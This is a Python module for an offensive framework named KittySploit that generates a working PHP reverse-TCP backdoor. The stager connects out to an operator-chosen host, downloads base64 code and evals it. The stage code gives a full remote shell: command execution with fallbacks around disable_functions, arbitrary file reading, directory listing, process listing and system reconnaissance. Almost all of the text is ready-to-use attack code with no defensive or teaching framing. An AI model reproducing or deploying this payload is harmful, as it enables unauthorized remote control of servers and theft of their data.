#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *


class Module(Payload):
    CLIENT_LANGUAGE = "php"

    __info__ = {
        'name': 'PHP Meterpreter, Reverse TCP',
        'description': 'Meterpreter-like PHP payload that connects back via TCP',
        'author': 'KittySploit Team',
        'version': '1.0.0',
        'category': PayloadCategory.SINGLE,
        'arch': Arch.PHP,
        'platform': Platform.ALL,
        'listener': 'listeners/multi/meterpreter_reverse_tcp',
        'handler': Handler.REVERSE,
        'session_type': SessionType.METERPRETER,
        'references': []
    }

    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    encoder = OptString('', 'Encoder', False, True)

    def generate(self):
        php_code = f"""
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time',0);
$h='{self.lhost}';
$p={self.lport};
$s=@stream_socket_client('tcp://'.$h.':'.$p,$e,$es,10);
if(!$s && function_exists('fsockopen')){{$s=@fsockopen($h,$p,$e,$es,10);}}
if($s){{
  @stream_set_blocking($s,true);
  @stream_set_timeout($s,30);
  fwrite($s,'KSPHP1');
  $l='';
  while(strlen($l)<4 && !feof($s)){{$c=fread($s,4-strlen($l));if($c===false||$c===''){{break;}}$l.=$c;}}
  if(strlen($l)===4){{
    $u=unpack('Nlen',$l);
    $n=$u['len'];
    $d='';
    while(strlen($d)<$n && !feof($s)){{$c=fread($s,min(8192,$n-strlen($d)));if($c===false||$c===''){{break;}}$d.=$c;}}
    if(strlen($d)===$n){{
      $code=base64_decode($d);
      if($code!==false){{eval($code);}}
    }}
  }}
  fclose($s);
}}
"""
        return php_code.replace('\n', '').replace('  ', ' ').strip()

    def get_stage_code(self):
        return self.meterpreter_stage_code

    meterpreter_stage_code = r'''
function ks_read_exact($s,$n){
  $d='';
  while(strlen($d)<$n && !feof($s)){
    $c=fread($s,$n-strlen($d));
    if($c===false||$c===''){usleep(10000);continue;}
    $d.=$c;
  }
  return strlen($d)===$n?$d:false;
}
function ks_send_response($s,$out,$status=0,$err=''){
  if($out===null){$out='';}
  if($err===null){$err='';}
  $j=json_encode(array('output'=>(string)$out,'status'=>(int)$status,'error'=>(string)$err));
  if($j===false){$j='{"output":"","status":1,"error":"json encode failed"}';}
  fwrite($s,pack('N',strlen($j)).$j);
}
function ks_disabled(){
  $d=@ini_get('disable_functions');
  if(!$d){return array();}
  $a=preg_split('/[, ]+/',strtolower($d));
  return array_filter(array_map('trim',$a));
}
function ks_can($f){
  $d=ks_disabled();
  return function_exists($f)&&!in_array(strtolower($f),$d,true);
}
function ks_exec($cmd){
  $cmd=$cmd.' 2>&1';
  if(ks_can('proc_open')){
    $p=array(array('pipe','r'),array('pipe','w'),array('pipe','w'));
    $h=@proc_open($cmd,$p,$pipes);
    if(is_resource($h)){
      fclose($pipes[0]);
      $o=stream_get_contents($pipes[1]);
      $e=stream_get_contents($pipes[2]);
      fclose($pipes[1]);fclose($pipes[2]);
      $rc=proc_close($h);
      return array($o.$e,$rc);
    }
  }
  if(ks_can('shell_exec')){return array((string)@shell_exec($cmd),0);}
  if(ks_can('passthru')){ob_start();@passthru($cmd,$rc);$o=ob_get_clean();return array($o,$rc);}
  if(ks_can('system')){ob_start();@system($cmd,$rc);$o=ob_get_clean();return array($o,$rc);}
  if(ks_can('exec')){$a=array();@exec($cmd,$a,$rc);return array(implode(PHP_EOL,$a).PHP_EOL,$rc);}
  return array('',1);
}
function ks_ls($path){
  if($path===''){$path=getcwd();}
  if(!is_dir($path)){return array('',1,'ls: '.$path.': No such directory');}
  $files=@scandir($path);
  if($files===false){return array('',1,'ls: cannot read '.$path);}
  $out='';
  foreach($files as $f){
    if($f==='.'||$f==='..'){continue;}
    $full=rtrim($path,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$f;
    $out.=$f.(is_dir($full)?'/':'').PHP_EOL;
  }
  return array($out,0,'');
}
function ks_sysinfo(){
  return "Computer\t\t: ".php_uname('n').PHP_EOL.
         "OS\t\t\t: ".php_uname('s').' '.php_uname('r').PHP_EOL.
         "Architecture\t\t: ".php_uname('m').PHP_EOL.
         "Meterpreter\t\t: PHP".PHP_EOL.
         "PHP Version\t\t: ".PHP_VERSION.PHP_EOL;
}
while(!feof($s)){
  $lb=ks_read_exact($s,4);
  if($lb===false){break;}
  $u=unpack('Nlen',$lb);
  $n=$u['len'];
  if($n<=0||$n>10485760){break;}
  $raw=ks_read_exact($s,$n);
  if($raw===false){break;}
  $cmd=json_decode($raw,true);
  if(!is_array($cmd)){ks_send_response($s,'',1,'invalid json');continue;}
  $c=isset($cmd['command'])?$cmd['command']:'';
  $args=isset($cmd['args'])&&is_array($cmd['args'])?$cmd['args']:array();
  $line=isset($cmd['command_line'])?$cmd['command_line']:null;
  if($c==='exit'){break;}
  if($c==='sysinfo'){ks_send_response($s,ks_sysinfo());continue;}
  if($c==='getpid'){ks_send_response($s,'Current pid: '.getmypid().PHP_EOL);continue;}
  if($c==='getuid'||$c==='whoami'){ks_send_response($s,'Server username: '.get_current_user().PHP_EOL);continue;}
  if($c==='pwd'){ks_send_response($s,getcwd().PHP_EOL);continue;}
  if($c==='cd'){
    $p=count($args)>0?$args[0]:'';
    if($p!==''&&@chdir($p)){ks_send_response($s,'');}else{ks_send_response($s,'',1,'cd: '.$p.': No such directory');}
    continue;
  }
  if($c==='ls'||$c==='dir'){
    $p='';
    foreach($args as $a){if(strlen($a)>0&&$a[0]==='-'){continue;}$p=$a;break;}
    $r=ks_ls($p);ks_send_response($s,$r[0],$r[1],$r[2]);continue;
  }
  if($c==='cat'||$c==='type'){
    $p=count($args)>0?$args[0]:'';
    if($p===''||!is_readable($p)||is_dir($p)){ks_send_response($s,'',1,'cat: cannot read '.$p);}
    else{ks_send_response($s,(string)@file_get_contents($p));}
    continue;
  }
  if($c==='execute'||$c==='shell'){
    $cmdline=$line!==null?$line:implode(' ',$args);
    if($cmdline===''){ks_send_response($s,'',1,'Usage: execute <command>');continue;}
    $r=ks_exec($cmdline);ks_send_response($s,$r[0],$r[1],'');continue;
  }
  if($c==='ps'){$r=ks_exec(strncasecmp(PHP_OS,'WIN',3)===0?'tasklist':'ps aux');ks_send_response($s,$r[0],$r[1],'');continue;}
  if($c==='screenshot'){ks_send_response($s,'',1,'screenshot is not implemented for PHP meterpreter');continue;}
  if($c==='getsystem'){ks_send_response($s,'',1,'getsystem is not supported by PHP meterpreter');continue;}
  $r=ks_exec(trim($c.' '.implode(' ',$args)));ks_send_response($s,$r[0],$r[1],'');
}
'''
